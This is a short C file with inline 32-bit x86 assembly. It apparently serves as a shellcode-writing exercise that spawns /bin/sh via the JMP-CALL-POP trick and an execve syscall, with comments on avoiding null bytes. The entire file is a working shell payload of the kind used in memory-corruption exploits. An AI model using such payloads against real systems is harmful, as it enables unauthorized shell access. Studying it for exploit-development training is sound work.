#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{

    asm (
        "JMP _WANT_BIN_BASH;"

        "_GOT_BIN_BASH:;"
        "XOR EAX, EAX;" // Zero the EAX register
        "MOV AL, 0x0B;" // Use only AL so that opcode will not include any 0x0
        "POP EBX;" // the RET value in our case /bin/sh
        "XOR ECX, ECX;" // although it is not the convention, we can let argv argument to be NULL also
        "XOR EDX, EDX;" // envp argument should be NULL
        "INT 0x80;" // call syscall instruction

        "_WANT_BIN_BASH:;"

        "CALL _GOT_BIN_BASH;"
        ".STRING \"/bin/sh\";"

    );

    return 0;
}
